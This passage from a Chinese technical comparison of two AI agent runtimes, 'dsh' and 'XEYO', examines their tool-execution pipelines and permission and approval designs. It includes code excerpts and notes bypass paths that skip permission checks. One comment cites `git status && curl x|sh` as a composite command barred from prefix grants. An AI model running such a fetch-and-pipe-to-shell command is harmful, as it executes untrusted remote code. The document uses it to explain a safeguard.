| 结果冻结 | `tools/result` 前强制 deep-freeze（不变量） | 无 |
| 权限位置 | 管线（pre-execute），工具无关 | 注册表 run 内，但工具可重入 |
| 旁路 | 无（一切经 `ctx.fs`/`ctx.shell`） | 4 条（1 条默认关） |

---


> 来源：**R3 实现面·实现级对比** · 原节「8. 工具执行管线：实现级」（源 L891–967）

##### 8. 工具执行管线：实现级

###### 8.1 dsh：一个 tool call 的完整阶段表

对照 `docs/tool-execution-pipeline.md` 与源码，**逐阶段**：

| # | 阶段 | 实现位置 | 可拦截点 | 失败行为 |
|---|---|---|---|---|
| 1 | 模型输出 → tool_call 解析 | `agent.ts:470`（filter `type==='tool-call'`） | — | 无 tool call → `{kind:'completed'}` |
| 2 | 参数解析 | `tool-calls.ts:105-111` | — | **JSON 失败保原串**，空串 → `{}` |
| 3 | 计划与分组 | `tool-calls.ts:72-100` | — | — |
| 4 | 分类 mode | `ctx.tools.executionMode(exec)` `:89`, `:205` | — | 运行期可变，可插入 barrier |
| 5 | 落 `tool/call` | `:264` | — | — |
| 6 | **prepare**（物化 + pre-execute + guard） | `TOOL_RUNTIME_SCHEDULER.prepare` `:170` | **`tools/pre-execute` waterfall**（并发 `waterfalls`）+ 单调 guard | 返回三分支；抛错 → schedulerFailure |
| 7 | **dispatch**（around-dispatch + body） | `:174` | **`tools/execute` wrapper**（可替换 signal） | 抛错 → `schedulerFailure`，**不合成结果** |
| 8 | **finalize / finish**（post-execute + 内容定稿） | `:153-154` | **`tools/post-execute` waterfall** | `TypeError` on illegal accept |
| 9 | 落 `tool/result` | `:282-289` | — | — |
| 10 | 附加上下文入下一 step | `:157` `acceptContext` → `inbox.splice('next-step', …)` `agent.ts:474` | — | — |

**四个实现级不变量**（都在代码注释里写死）：

1. **「Dispatch may overlap, while policy, results, and result context remain model-ordered」**（`tool-calls.ts:4-5`）——**并发只发生在 body，policy 与结果顺序严格按模型序**。
2. **prepare 是有序的**（`:216-218` 注释）：「Ordered pre-execute may await; only dispatch/body overlaps.」
3. **abort 时 started 的先结算、unstarted 的补合成结果**，且「returns with the signal still aborted」（`:44-49`）。
4. **调度器失败绝不编造结果**（`:8-10`）：「A terminal scheduler failure preserves already-recorded `tool/call` events without fabricating results.」

**`finalize` 与 `finish` 的分工**在 `:1723-1757` 的实现里可见：`finalize` 跑 `tools/post-execute` 瀑布后做 `finalizeContent`；`finish` 只做后者。

###### 8.2 dsh 结果截断：spill 的头尾预算

**文件**：`packages/spill/spill-policy/src/index.ts`

```ts
// :94-98
function headTailPreview(text: string, budget: number): string {
  const headBytes = Math.ceil(budget / 2)
  const tailBytes = Math.floor(budget / 2)
  const retainer = new TextRetainer({ kind: 'headTail', headBytes, tailBytes })
  …
}
```

即：**预算对半分头尾**（head 向上取整、tail 向下取整，奇数预算时头多 1 字节），而不是常见的「保头丢尾」。`spill-local` 提供 `store.ts` / `cleanup.ts`（实际落盘与清理），`spill` 定义 seam（`index.ts` / `types.ts`）。policy 注释（`:6`）说明产出是「bounded head/tail preview plus the backend's …」。

**`fs-tool` 的 `spillStore`**（tool-catalog 里 glob/grep 一行）：**「Capped results save the complete formatted list through the optional `ctx.spillStore` backend; returned locators are follow-up-readable/searchable」**——即截断后给模型的是**可追查的定位符**，不是死文本。

###### 8.3 XEYO：内联链 + 路由标记 + 三条旁路

XEYO 的管线是**函数内联链**（第二轮已定性），本轮补实现级细节：

- **结果截断**：`ToolMeta.output_budget` 是 per-tool 字符预算（默认 16000），`0` = 豁免；`ToolResultEvent.spilled: bool` 与 `duration_ms: int`（`events.py:78-79`）是截断与耗时的**对外可见证据**，注释标注为「T13：tool_call.end 元数据」。
- **外部化（L3 offload）**：`offload_read` 工具（`exposure="hidden"`）用于**按行区间读取被外部化的工具结果文件**——与 dsh 的 spill 是同一问题的两种解法：dsh 给「头尾预览 + 定位符」，XEYO 给「截断 + 一个专门的按需读取工具」。
- **Bash 路由标记**：`[routed: Bash …→…]`（AGENTS.md 契约）——纯文件读命令且目标在工作区内时改走专用工具，结果头带一行标记。这是**观测域一致性**的实现：路由本身是执行层动作，标记是给模型的信息。
- **三条旁路**（第二轮已定位，本轮补「绕过什么」）：

| 旁路 | 实现文件 | 绕过 |
|---|---|---|
| `server/workspace_fs.py` 直写 | `python/server/workspace_fs.py` | 权限 / rewind / 审计（默认只读开关关） |
| 后台 bash job | `python/tools/job_tools.py` + 24h 超时 | 主链超时与权限（事实无超时） |
| WriteStore 写路径 | `python/engine/write_store.py` | 统一写通道（`needs_write_store` 是 `ToolMeta` 字段，说明这是**注册时选择**而非统一强制） |

###### 8.4 管线实现级对照

| 维度 | dsh | XEYO |
|---|---|---|
| 形态 | **命名事件瀑布**，4 个可拦截点（pre-execute / execute / post-execute / ptc-dispatch-log） | 函数内联链 + **单钩子接缝**（`extension/hooks.py` 的 `PreToolUse`/`PostToolUse`） |
| 第三方拦截 | 是（waterfall 可改 decision/result/content） | 是（hook 可 abort；`PermissionRequest` 非 Success → fail-closed DENY） |
| 并发边界 | **policy 与结果严格模型序，仅 body 重叠**（有上限 10 + barrier） | 内联 `while pending`，只读工具可早跑 |
| 结果顺序 | `commitReady()` 连续指针，**只沿连续槽位推进** | store 追加序 |
| 参数解析失败 | 保原串交给工具 schema | 同（Python dict 解析后交工具） |
| 截断 | head/tail 各半 + spillStore + 可追查定位符 | per-tool `output_budget`（默认 16000）+ spill + `offload_read` 专用工具 |
| 失败语义 | 显式 `isError` + 结构化 `error.info`；abort 合成结果保 replay | `is_error` + 占位补全 |
| 旁路 | 一切经 `ctx.fs` / `ctx.shell` / `ctx.tools`（seam 强制） | **三条旁路各有绕过面** |
| 自我修改工具 | 有（7 个 `cordis_*`） | 无 |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§3 工具执行管线：逐阶段、逐拦截点」（源 L424–507）

##### §3 工具执行管线：逐阶段、逐拦截点

###### 3.1 dsh —— 事件瀑布式管线

dsh 的工具执行是**一条 `tools/*` 事件瀑布**（`ctx.on(...)` + `next()`），每个插件声明自己挂在哪一环。本轮从 guard / spill / timeout 三个包的 `apply()` 里读到实际挂载点：

| 阶段 | 事件/接口 | 实现文件:行 | 第三方可否拦截 | 失败行为 |
|---|---|---|---|---|
| 1. 解析 | 模型 `tool/call` 事件落 `arguments: string` | `core/session/src/types.ts:319` | — | 原样保留字符串 |
| 2. 执行入口 | `tools/execute`（可被包装的 waterfall） | `guard/timeout-policy/src/index.ts`（`ctx.on('tools/execute', …)`） | ✅ 可包装 | 透传 |
| 3. 超时 | `tools/execute` 包装：读 `ctx.tools.get(name, agent)?.timeoutMs` | 同上；`TOOL_TIMEOUT = 'TOOL_TIMEOUT'` | ✅ | **无 timeoutMs → 无 deadline，直接 delegate**；到期 → 替换为 `isError` 结果 |
| 4. 权限（Pre 决策） | `PreToolDecision` / hook `PreToolUse` | `hooks/hooks-*/src/index.ts` | ✅ | Codex 只认 `deny`；CC 认 `allow`/`deny`/`ask` |
| 5. 沙箱 | `ctx.sandbox.confine(argv, policy)` | `sandbox/sandbox/src/index.ts:175` | ❌（provider 内部） | **fail-closed** |
| 6. 执行 | provider 跑 confined argv | `sandbox/sandbox-local/src/index.ts` | ❌ | `SANDBOX_UNAVAILABLE` |
| 7. 结果后处理 | `tools/post-execute`（可被包装） | `guard/repeat-tool-reminder/src/index.ts`、`spill/spill-policy/src/index.ts` | ✅ 可 block / 可换内容 / 可加 `additionalContexts` | 见下 |
| 8. PTC 子调用日志 | `tools/ptc-dispatch-log` | `spill-policy`（第二条臂） | ✅ | 只压日志副本，不动程序值 |
| 9. 落事件 | `tool/result` | `core/session/src/types.ts:331` | ❌ | `meta` 非 JSON 可序列化即**在源头拒收**（`isJsonValue` 校验） |

**`tools/post-execute` 的决策类型（三态）**

| 决策 | 语义 | 证据 |
|---|---|---|
| `{kind:'block', feedback, additionalContexts?}` | 阻断并回灌反馈 | `repeat-tool-reminder` 里对 `downstream.kind === 'block'` 的分支 |
| 内容替换（value replacement） | 换掉模型可见内容 | `spill-policy` 注释："Accepted value replacements pass through for registry revalidation and rendering; this presentation policy cannot also replace content in the same mutually exclusive decision." |
| 附加上下文（`additionalContexts`） | 不改内容只加料 | `prependContext(ours, theirs)` 保留下游 source 与 metadata |

**关键不变量（原文）**：`repeat-tool-reminder` 的注释写明——**counting 放在 post-execute，因为被拒的调用也流经同一条瀑布**：

> Counting happens here — in post-execute — because denied calls also flow through this waterfall (`ToolRuntime.execute` routes a deny through the same pipeline), and a model hammering a denied call is exactly the loop worth breaking.

这一条与 XEYO 的理念铁律（"观测域一致性"）是同一个洞见的不同表达。

###### 3.2 XEYO —— 调用链式管线（含 3 条旁路）

| 阶段 | 实现位置 | 说明 |
|---|---|---|
| 1. 解析 tool_use | `engine/query_loop.py`（`_assistant_tool_uses:192`、`_message_tool_call_id:205`） | 从 assistant 消息取 tool_use 块 |
| 2. 配对修复 | `_repair_unpaired_tool_calls:218`、`_fill_missing_tool_results:244` | **只在 submit 入口 + abort 路径各做一次**，不在每轮全量扫 store（注释明写） |
| 3. 只读预取 | `_eligible_for_early:155`、`early_readonly_tools_enabled:112`、`_cancel_early_tasks:179` | 只读工具提前并发 |
| 4. 预算闸 | `budget.begin_tool_call()`（`query_loop.py:1075`） | `forced_wrap_up` 时**跳过**该闸（`R3'`） |
| 5. 权限判定 | `permissions/policy.py::evaluate_policy`（见 §4） | 5 道硬拦 + grant store |
| 6. 执行 | 工具实例 |
| 7. 结果后处理 | `query_loop.py:1940-1990`：suffixes 拼接 → `ResultFold.process()` 折叠 | |
| 8. 写 store | `store.append(tool_result_message(...))`（`:1976`） | |
| 9. 发事件 | `ToolResultEvent`（`:1946`） | 含 `duration_ms`、`spilled` |

**与 dsh 的管线形态差异**

| | dsh | XEYO |
|---|---|---|
| 形态 | **事件瀑布**（插件各挂一环，可互相包裹） | **顺序调用链**（写死在 query_loop） |
| 第三方扩展点 | 9 个阶段中 6 个可拦截 | 0 个（只有 T_now 文本注入） |
| 超时 | 声明式（`tool.timeoutMs`）+ 独立 policy 包 | 工具内部各自实现 |
| 结果后处理 | 可 block / 可替换 / 可加料，**三态俱全** | 只有"追加后缀 + 折叠"，无 block |
| 重复检测位置 | post-execute（**拒绝也计数**） | `RepeatCallGuard`（轮内状态，`clear_advice` 每轮重置） |
| 折叠 | ❌ | ✅ `IdenticalResultFold`（同签名+同输出 → 一行 `[fold]`） |

**XEYO 的三条旁路（绕过主链）**

| 旁路 | 文件 | 绕过什么 |
|---|---|---|
| `workspace_fs` 直写 | `server/workspace_fs.py` | 绕过权限判定 / rewind / 审计（默认只读开关关） |
| 后台 bash job | 24h 超时（≈事实无超时） | 绕过工具超时与轮内预算闸 |
| WriteStore 写路径 | 写工具经 `needs_write_store` 注入 | 不经 rewind 的 Before 快照 |

###### 3.3 逐工具配对表（同名/同能力）

| 能力 | dsh | XEYO | 实现差异 |
|---|---|---|---|
| 读文件 | `read` | `Read` | dsh 有 `read_image` 独立工具；XEYO 把 vision 折进 `Read`（`apply_read_vision`），Read 的 `output_budget=0` 防 read→spill→read 回环 |
| 写文件 | `write` | `Write` | 两侧都要求先读；XEYO 另走 `needs_write_store` 注入 |
| 改文件 | `edit` + `str_replace_editor` | `Edit` + `NotebookEdit` | dsh 的 `str_replace_editor` 是另一套编辑器语义；XEYO 的 NotebookEdit 专治 .ipynb |
| 查找 | `glob` / `grep` | `Glob` / `Grep` | XEYO 额外有 Bash→Glob/Grep 的**透明路由**（`.xeyo-policy.json` 的 `bash_routing`） |
| 执行 | `bash` / `pwsh`（+persistent） | `Bash`（1 个） | XEYO 有 45s 未完**自动 promote 后台**（见前轮）；dsh 需模型预判 `run_in_background` |
| 终端 | 6 个 `terminal_*` | ❌ | dsh 独有 PTY 持久会话 |
| 子代理 | `subagent`（+4 控制） | `Agent`（1） | dsh 可 `list_agents`/`interrupt_agent`/`send_message` 续聊子代理 |
| 待办 | `todo_write` | `TodoWrite` | 同名语义 |
| 网络 | `web_fetch` / `web_search` | `WebFetch` / `WebSearch` | XEYO 两侧都是 `outbound_ask` 策略；dsh 由 hook 与 permission 决定 |
| 提问 | `ask_user_question` | `AskUserQuestion` | 两者都挂起等用户 |
| 会话自查询 | 5 个 `session_*` | ❌ | dsh 独有（事件溯源红利的直接兑现） |
| LSP | `lsp` | `Diagnostics`（自陈非全量 LSP） | 能力层级差 |

---


## 域 11 · 权限与审批（含逐分支与字段）

> 来源：**R1 功能面·全量对比** · 原节「10. 权限与审批」（源 L277–293）

##### 10. 权限与审批

| 维度 | XEYO | dsh |
|---|---|---|
| 决策词表 | **ASK / ALLOW / DENY**（`PolicyDecision`，`policy.py:54-68`） | **ask / never** 策略 + 结果 `allowed-once`/`rejected`/`cancelled`/`unavailable`（`user-approval/src/types.ts:32`）——**无 DENY/ALLOW 词** |
| 判定顺序 | `deny_tools`→DENY → `mcp__*` → Mcp 网关 → `ALWAYS_ALLOW`→ALLOW → `OUTBOUND_ASK`→ASK → ASK 时查 grant（`policy.py:1404-1429`, `:1375-1386`） | aborted→cancelled → 策略 `never`→**确定性 rejected（先于 waterfall）** → `approval/request` waterfall → 无 answerer → `unavailable`（fail closed） |
| grant 指纹 | `v2:` + sha256(["mcp-tool", 注册名])[:32]；**参数不进指纹**（注入免疫，`store.py:444-456`）；v1 不兼容 | **未见**等价 grant 指纹概念；审批为一次性 |
| DENY 可否被 grant 穿透 | **不可**（`policy.py:1331`） | 不适用 |
| 挂起/恢复 | HTTP：`POST /v1/permission/resolve`、`/v1/ask/resolve`、`/v1/plan/{turn_id}/approve`（`server/routers/control.py:145,216,278`）；TTL 风险分级（`store.py:91-99`） | `ctx.approval` 一次性决策；`approval/asked`+`approval/decided` **入 session log**（`user-approval/src/index.ts:217,224`）且要求 open turn（`:77-84`） |
| 预设 | `readonly`/`workspace-write`/`full`（默认 workspace-write，`permissions/presets.py:11-12`） | `workspace-write`+ask / `danger-full-access`+never（两旋钮 = sandbox mode × approval policy，`permission-presets/src/index.ts:170-179`） |
| 模式 | `always`/`risk`/`never`/`allow`（`policy.py:75`） | 无对应四模式；只有 sandbox 三档 |
| 审计 | `approval/*` 事件 + `audit/` 模块 | 审批审计对入 log，可回放（turn 包裹） |

> **重要差异**：dsh 把「沙箱模式」当作权限的**主要旋钮**——权限≈隔离强度。XEYO 没有沙箱，权限=**工具级 grant + 危险名单**。两者的安全模型不是同一个东西。

---


> 来源：**R2 设计面·设计级对比** · 原节「9. 权限与审批」（源 L588–636）

##### 9. 权限与审批

###### 9.1 dsh：两个旋钮，权限 ≈ 隔离强度

- **两旋钮**：`sandbox-mode`（read-only / workspace-write / danger-full-access）× `approval-policy`（ask / never）。预设：`workspace-write(ask)`、`danger-full-access(never)`（`interaction/permission-presets/src/index.ts:170-179`）。
- **判定顺序**（`interaction/user-approval/src/index.ts:258-298`）：

```
signal.aborted                          → 'cancelled'
effectivePolicy == 'never'              → 'rejected'   （先于 waterfall，确定性）
approval/request waterfall              → 无 answerer → 'unavailable'（fail closed）
```

- **挂起即入日志**：`request()` 写 `approval/asked` + `approval/decided` 事件（`:217,224`），且**必须处于 open turn**（`:77-84`）——审批是可回放的历史事件，不是旁路状态。
- **没有 grant 指纹**：审批是**一次性**的。身份标识用 `agent.session`。
- 作者对预设的定位（`permission-presets/src/index.ts:48-54`）：「Records the selected preset as durable, **log-only** user intent… stays out of the model transcript」——即：记录用户意图但**不给模型看**。这一点与 XEYO 的 T_now `runtime_mode_snapshot` 块（把审批模式快照给模型）**取向相反**。

###### 9.2 XEYO：工具级三值 + grant 指纹 + HTTP 挂起

- **词表**：`ASK / ALLOW / DENY`（`permissions/policy.py:54-68`）；模式 `always / risk / never / allow`（`:75`）。
- **判定顺序**（`evaluate_policy_impl`，`policy.py:1391-1429`）：

```
deny_tools 命中            → DENY
mcp__*                     → 走 Mcp 网关
_ALWAYS_ALLOW 命中         → ALLOW
_OUTBOUND_ASK 命中         → ASK
ASK 时查 grant 命中        → ALLOW（store.py:1336-1386）
```

- **grant 指纹 v2**：`"v2:" + sha256(["mcp-tool", 注册名])[:32]`，**参数不进指纹**（`store.py:444-456`）→ 对提示注入免疫；Bash 用命令前缀作指纹（`store.py:459-497`）。**DENY 不可被 grant 穿透**（`policy.py:1331` 守卫）。
- **挂起/恢复**：`PendingPermissionStore.create/resolve/wait`（`store.py:71/136/208`）+ HTTP `POST /v1/permission/resolve`（`server/routers/control.py:145`）；TTL 风险分级（`store.py:91-99`）。
- **审批记录**：`approval/*` 事件 + `audit/` 模块（JSONL，`audit/log.py:30-45`，经 `scrub_audit_fields` 脱敏）。

###### 9.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 决策词表 | ask / never（策略）+ allowed-once / rejected / cancelled / unavailable（结果） | ASK / ALLOW / DENY |
| 主旋钮 | 沙箱模式（权限≈隔离强度） | 工具级授权（权限=谁能调什么） |
| 记忆性 | 一次性，无指纹 | grant 指纹（v2，参数免疫）+ TTL 分级 |
| 挂起记录 | `approval/asked`+`decided` 入 session log，**必须 open turn** | HTTP resolve + pending store |
| 模式是否告知模型 | **不告知**（log-only，明确不进 transcript） | 告知（T_now `runtime_mode_snapshot` 块） |
| DENY 语义 | 不适用（无 DENY 词） | 硬 DENY，grant 不可穿越 |

**安全模型不重叠**：dsh 关心"这行命令在什么隔离等级下跑"，XEYO 关心"这个工具这次调用被谁授权过"。两者可以叠加，但没有一方实现了另一方。

---


> 来源：**R3 实现面·实现级对比** · 原节「9. 权限与审批：实现级」（源 L968–1161）

##### 9. 权限与审批：实现级

###### 9.1 dsh：审批是一个 capability seam，不是工具门

**文件**：`packages/interaction/user-approval/src/`（`index.ts` 301 + `invariant.ts` 111 + `types.ts` 91）

**审批策略是二值**（`index.ts:60-63`）：

```ts
export type ApprovalPolicy = 'ask' | 'never'
export const APPROVAL_POLICIES: readonly ApprovalPolicy[] = ['ask', 'never']
```

docstring 把两条语义写得很清楚（`:51-58`）：
- `'ask'`（**默认**）——委托给已组合的 answerer；**没有 answerer 就 fail closed**；
- `'never'`——**不向任何人提问**，每个 ask 直接 `'rejected'`。这是「不用问就能知道结果的策略」。

**结果词汇是封闭的、且只有一个授予值**（`request()` docstring `:191-206`）：

| 情形 | 结果 |
|---|---|
| 正常同意 | `'allowed-once'`（**唯一授予**） |
| signal 被 abort | `'cancelled'` |
| answerer 缺失或抛错 | `'unavailable'`（**fail closed**） |
| answerer 返回词汇外值 | **归一为 `'unavailable'`** |

**审计对必须被 turn 包住**（`:210-216`）：

```ts
if (!hasOpenTurn(session)) {
  throw new Error('approval.request() outside an open turn: the approval/asked + approval/decided audit pair '
    + 'must be turn-enclosed (a bare event between turns is crash-tail garbage on reload). …')
}
```

——`approval/asked` + `approval/decided` 是**成对持久化**的；注释进一步声明「返回未记日志的决定会破坏成对性，所以审计 append 失败也必须 reject」。

**策略可见性的双轨实现（这是本轮最有意思的实现细节之一）**：

1. **`approval/policy` 事件是 log-only**（`:26-33` 注释）：

> The session's approval policy was switched — log-only, durable, replayable, **never in the model transcript** (the model learns the policy …

2. **但策略确实会告诉模型**——通过一条**动态 context**（`:153-167`）：

```ts
// The complete current value travels after retained history, so switching
// policy does not rewrite the stable system-prompt cache prefix.
ctx.inject(['systemPrompt'], (scope) => {
  scope.systemPrompt.context({
    name: 'approval:policy',
    order: scope.systemPrompt.getContextOrder('APPROVAL_POLICY'),   // = 115
    text: (context) => {
      const agent = context.agent
      if (agent === undefined) return ''
      const policy = effective(agent)
      return policy === 'never' ? NEVER_SENTENCE : ASK_SENTENCE
    },
  })
})
```

注释写明了动机：**「完整当前值走在保留历史之后，所以切换策略不会重写稳定的 system-prompt 缓存前缀。」** 即：换策略 → 尾部动态 context 变化，前缀不动。

3. **切换动作本身**通过 `agent.inject()` 发一条 user 消息（`:180-190`）：`'The approval policy changed from "X" to "Y" (changed by the user).'`。

**沙箱升级与审批的耦合**（`packages/sandbox/sandbox/src/escalation.ts:146-175`）——`approveEscalation()` 是一个**严格有序的 fail-closed 序列**：

```ts
// ① 严格放宽检查（执行期检查，非 schema 约束）
if (!(WIDER_MODES[effectiveMode] ?? []).includes(mode)) {
  throw new Error(`sandbox escalation to "${mode}" is not strictly wider than this call's current "${effectiveMode}" mode`)
}
if (approval.approver === undefined) throw new Error(`… requires approval, but no approval service is composed`)
if (approval.agent === undefined)   throw new Error(`… requires approval, but the call has no agent to route it through`)
const outcome = await approval.approver.request({ … })
```

注释明确：**非放宽的请求永远不打扰人类**（"A non-widening request never prompts a human"），而**授权只作用于提出申请的那一次调用**（"the granted mode … consumed by the one call that asked"）。

**权限档位的三旋钮结构**（`packages/interaction/permission-presets/src/index.ts`）：一个 preset 同时写 `sandbox` 与 `approval` 两个值（`PresetSpec { sandbox: SandboxMode; approval: ... }` `:58-61`），当前值由**三个整值 knob 事件**（`permission/preset`、`sandbox/mode`、`approval/policy`）折出 `permissions` 投影（`types.ts:34-43`）；匹配不上任何表项时派生 `custom`（`:321-334`）。

**一个防误配的启动期断言**（`:195-197`）：

```ts
if (ctx.shell.sandboxMode === undefined) {
  throw new Error('permission: the mounted bash executor does not confine (no sandboxMode) — presets bundle a sandbox mode, so composing this plugin over an unconfined executor is a misconfiguration')
}
```

——即**权限预设不允许装在不会沙箱的执行器上**，这是编译期思维搬到运行期。

###### 9.2 XEYO：判定函数 + 挂起存储 + grant 指纹

**判定入口两层**（`python/permissions/policy.py`）：

```python
def evaluate_policy(name, tool_input, *, cwd, allowed_paths=None, tool=None) -> PolicyDecision:
    """T10：外层叠加 grant store。ASK 先查 always-allow 授权；DENY 不可被 grant 触碰。"""
    decision = evaluate_policy_impl(name, tool_input, cwd=cwd, allowed_paths=allowed_paths, tool=tool)
    if decision.decision != PermissionDecision.ASK:
        return decision                      # ← DENY/ALLOW 在此终止，grant 永远碰不到
    try:
        from permissions.store import default_grant_store, grant_fingerprint
        from permissions.write_scope import get_write_scope
        if get_write_scope() is not None:  return decision   # worker 沙箱：grant 不得放宽
        if is_remote_session(_session_id()): return decision  # 远程会话不得静默放行（§34 不变量）
        if permission_mode() == "always": return decision     # 用户显式要求逐条确认
        if name.lower() == "bash":
            if bash_command_is_composite(cmd): return decision  # G29：组合命令不得吃前缀 token grant
        fp = grant_fingerprint(name, tool_input, matched_rule=…, mcp_target=…)
        if not fp: return decision
        identity_name = decision.mcp_target.strip() or name
        grant = default_grant_store().match(tool_name=identity_name, fingerprint=fp, scope=cwd or "")
        if grant is None: return decision
        return PolicyDecision(decision=ALLOW, reason="always_allow_grant", matched_rule="grant_store", …)
    except Exception:
        return decision                      # 任何异常 → 回到原 ASK（fail-safe）
```

**四条 grant 豁免**（worker / remote / always / 组合 bash）与**一个异常兜底**，全部有注释锚定事故编号（G29、§34、T10）。

**`evaluate_policy_impl` 的分支顺序（逐分支实测，`:1391-1700`）**：

| 顺序 | 分支 | 结果 |
|---|---|---|
| 1 | `raw_name in pol.deny_tools`（workspace policy 显式禁） | DENY / `policy_deny_tool` |
| 2 | `raw_name.startswith("mcp__")` | → `_evaluate_mcp(...)`（企业 deny 最严胜出 → tool_policies → 未知兜底） |
| 3 | `raw_name == "Mcp"`（网关工具） | → `_evaluate_mcp_gateway(...)`（list/describe 放行；call 解析目标身份后三态） |
| 4 | `in _ALWAYS_ALLOW` | ALLOW / `tool_unrestricted_p0` |
| 5 | `in _OUTBOUND_ASK_TOOLS` | 工作区路径校验（SendToWeChat 缺 path → DENY；路径外 → DENY）→ max 档 ALLOW，否则 ASK |
| 6 | `in _UI_ASK_TOOLS` | → `_evaluate_ui_ask(...)`（`list` 放行；其余按 action 分流） |
| 7 | `== "Agent"` | 默认 ALLOW；`permission_mode()=="always"` → ASK |
| 8 | `== "Bash"` | → `_evaluate_bash(...)` |
| 9 | `in _READ_PATH_TOOLS` | `check_read_permission_for_path` → ALLOW/ASK/DENY（DENY 再细分为 path_outside / secret_path / dangerous_path） |
| 10 | `in _WRITE_PATH_TOOLS` | 依次：Memory 特判 ALLOW → 缺 path DENY → **policy 文件 DENY** → **密钥路径 DENY** → **子 agent write scope DENY** → memdir（Write 还查 schema）→ **受保护元数据 DENY** → 工作区外 DENY（max 档除外）→ 模式合成 → worker scope（无 ASK）→ peer 热文件冲突 → auto_approve / ASK / ALLOW |
| 11 | 未知工具 | **ASK**（`unknown_tool_default_ask`，注释「不再宽松透传」） |

**写路径的「单向性」实现**（`:1628-1644`）值得单独引：

```python
mode = permission_mode()
if mode in _AUTO_WRITE_MODES:            # never/allow = 最高权限，跳过仓库收紧
    pass
elif pol.write in ("ask", "always"):
    mode = "always"                       # 收紧：非最高权限下强制每写确认
elif pol.write in ("never", "allow", "risk"):
    pass                                  # 单向性：不得把用户更严的选择放宽
```

注释点明事故来源：「仓库默认 write=ask 收紧若在此处反向 override 成 always（每写必问），会让最高权限仍弹『允许写入』确认（smoke-test #1）」。

**挂起存储 `PendingPermissionStore`**（`python/permissions/store.py`，508 行）：

- `create(...)` 14 个关键字参数（`session_id, turn_id, tool_name, tool_input, reason, prompt, request_id?, matched_rule, command_summary, choices?, peer_summary, mcp_target`）；
- **风险分级 TTL**（`:94-104`）：`danger/secret/protected` → **60s**；普通 → **180s**；`ttl<=0`（交互式）→ **不超时**；
- `resolve(request_id, approved, actor, outcome, *, choice)` → `bool`；`choice ∈ _VALID_USER_CHOICES` 时以 choice 为准，否则用 bool；**`resolve` 顺带写审计日志**（`audit.log.default_audit_log`）；
- `wait(...)`（`:208`）是 async 等待原语，`cancel_pending_for_session`（`:185`）按会话取消。

**grant 指纹（v2）逐字符实现**（`:444-456`）：

```python
def mcp_grant_fingerprint(registered_tool_name: str) -> str:
    tool = (registered_tool_name or "").strip()
    if not tool.startswith("mcp__") or len(tool) <= len("mcp__"):
        return ""                                # 身份不可用 → 空串，不可落 grant（fail-safe）
    canon = json.dumps(["mcp-tool", tool], ensure_ascii=True, separators=(",", ":"))
    digest = hashlib.sha256(canon.encode("utf-8")).hexdigest()[:32]
    return f"{_MCP_FP_VERSION}:{digest}"
```

即：**`"v2:" + sha256(JSON(["mcp-tool", 注册名]))` 的前 32 位十六进制**，**参数不进指纹**（防注入）。

**HTTP 接口（实测路由）**：`POST /v1/permission/resolve`（`control.py:145`）、`GET /v1/permissions/grants`（`:179`）、`DELETE /v1/permissions/grants/{grant_id}`（`:200`）、`POST /v1/ask/resolve`（`:216`）、`POST /v1/plan/{turn_id}/approve`（`:278`）。

###### 9.3 权限实现级对照

| 实现维度 | dsh | XEYO |
|---|---|---|
| 形态 | **独立 capability seam**（`ctx.approval`），另有 permission-presets 组合层 | **纯函数判定**（`evaluate_policy`）+ 挂起存储 + HTTP |
| 策略取值 | `ask` \| `never`（二值） | `always` \| `risk` \| `never` \| `allow`（四值）+ `agent`/`ask`/`plan` 模式 |
| 结果词汇 | `allowed-once` / `rejected` / `cancelled` / `unavailable`（封闭，唯一授予值） | `allow` / `ask` / `deny`（三态）+ `choice` 子词汇 |
| 无 answerer 时 | **fail closed**（`unavailable`） | 无 resolver 时 DENY（写路径注释明示） |
| 审计 | `approval/asked` + `approval/decided` 成对，**必须 turn 内**，否则抛错 | 挂起项内存 + `audit.log` 落盘；不强制 turn 包络 |
| 策略对模型的可见性 | 事件 log-only；**但**注册 `approval:policy` 动态 context 渲染句子（尾插，不破前缀） | `runtime_mode_snapshot` T_now 块（directive 类） |
| 授权粒度 | `allowed-once`（单次） | grant store 按 `(tool_name, fingerprint, scope)` 持久命中 |
| 指纹 | 未见（`approval/asked` 用 request id + toolName） | **v2 = sha256(JSON(["mcp-tool", 名字]))[:32]**，参数不进指纹 |
| 沙箱耦合 | **强**：preset 同时写 sandbox+approval；升级走 `approveEscalation` 严格放宽检查 | 弱：sandbox 只有 Windows Job Object / 容器路由，与审批无映射 |
| 防误配 | 启动期断言：装在不 confine 的执行器上直接抛错 | 无 |
| 远程/多会话 | 未见对应约束 | 显式：远程会话不得静默放行；peer 热文件冲突强制三选 ASK |
| 黑名单 | 未见 workspace 级 deny 列表 | `.xeyo-policy.json` 的 `deny_tools` 在最前判定 |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§4 权限判定：逐分支」（源 L508–644）

##### §4 权限判定：逐分支

###### 4.1 XEYO —— `evaluate_policy` 两条函数、分支顺序固定

**外层 `evaluate_policy`（`:1319-1388`）—— 5 道 grant 前置守卫**

```
evaluate_policy(name, tool_input, cwd, allowed_paths, tool)
  decision = evaluate_policy_impl(...)
  if decision.decision != ASK: return decision            # ← 非 ASK 终态，grant 不可触碰
  ├─ get_write_scope() is not None       → return          # worker 沙箱：grant 不得放宽
  ├─ is_remote_session(_session_id())    → return          # 远程会话不得静默放行（§34 不变量）
  ├─ permission_mode() == "always"       → return          # 用户显式要求逐条确认
  ├─ name == "bash" and bash_command_is_composite(cmd) → return   # G29：`git status && curl x|sh` 不得吃前缀 grant
  fp = grant_fingerprint(name, tool_input, matched_rule=..., mcp_target=...)
  if not fp: return
  identity_name = mcp_target or name                       # 存取同一身份
  grant = default_grant_store().match(tool_name=identity_name, fingerprint=fp, scope=cwd)
  if grant is None: return decision
  return PolicyDecision(ALLOW, reason="always_allow_grant", matched_rule="grant_store")
```

**内层 `evaluate_policy_impl`（`:1391-…`）—— 分支顺序（已读到前 6 条）**

| 序 | 条件 | 结果 | 证据行 |
|---|---|---|---|
| 0 | 取 `roots = _effective_roots(cwd, allowed_paths)`、`pol = load_workspace_policy(cwd)` | — | 1401-1402 |
| 1 | `raw_name in pol.deny_tools` | **DENY** `policy_deny_tool` | 1404-1410 |
| 2 | `raw_name.startswith("mcp__")` | → `_evaluate_mcp`（`:1150`） | 1413-1414 |
| 3 | `raw_name == "Mcp"` | → `_evaluate_mcp_gateway`（`:1217`） | 1418-1419 |
